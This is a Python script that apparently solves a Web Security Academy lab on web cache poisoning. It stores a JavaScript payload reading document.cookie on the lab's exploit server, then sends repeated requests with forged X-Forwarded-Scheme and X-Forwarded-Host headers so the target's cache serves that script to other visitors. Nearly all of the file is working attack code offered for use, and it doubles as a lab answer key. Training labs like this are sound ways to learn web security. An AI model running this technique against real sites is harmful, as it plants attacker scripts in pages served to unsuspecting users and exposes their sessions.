import sys
import requests
from bs4 import BeautifulSoup



def find_exploit_server(url, session):
    response = session.get(url, timeout=10)
    if "exploit-link" in response.text:
        soup = BeautifulSoup(response.text, "html.parser")
        exploit_server_url = soup.find("a", {"id": "exploit-link"}).get("href")
        return exploit_server_url


def store_exploit(exploit_server_url, session):
    data = {
        "urlIsHttps": "on",
        "responseFile": "/resources/js/tracking.js",
        "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: application/javascript; charset=utf-8",
        "responseBody": "alert(document.cookie);",
        "formAction": "STORE"
    }
    session.post(exploit_server_url, data=data, timeout=10)


def poison_web_cache(url, exploit_server_url, session):
    for i in range(100):
        #Poisoning web cache
        session.get(f"{url}/resources/js/tracking.js", headers={"X-Forwarded-Scheme": "x", "X-Forwarded-Host": exploit_server_url.replace("https://", "")}, timeout=10)

        #Checking if lab is marked complete
        response = session.get(url, timeout=10)
        if "Congratulations, you solved the lab!" in response.text:
            return True


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    try:
        url = sys.argv[1].rstrip("/")
        session = requests.Session()
        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=requests.adapters.Retry(total=3, backoff_factor=0.1)))

        print("(+) Finding exploit server...")
        exploit_server_url = find_exploit_server(url, session)
        if not exploit_server_url:
            print("(-) Exploit server not found. Check your URL and try again.")
            sys.exit(1)

        print("(+) Storing payload...")
        store_exploit(exploit_server_url, session)

        print("(+) Poisoning web cache...")
        if poison_web_cache(url, exploit_server_url, session):
            print("(+) Lab Solved Successfully!")
        else:
            print("(-) Something went wrong. Please try again.")


    except requests.exceptions.Timeout:
        print("(-) Request timed out.")

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to the host. Check your URL and try again.")


if __name__ == "__main__":
    main()
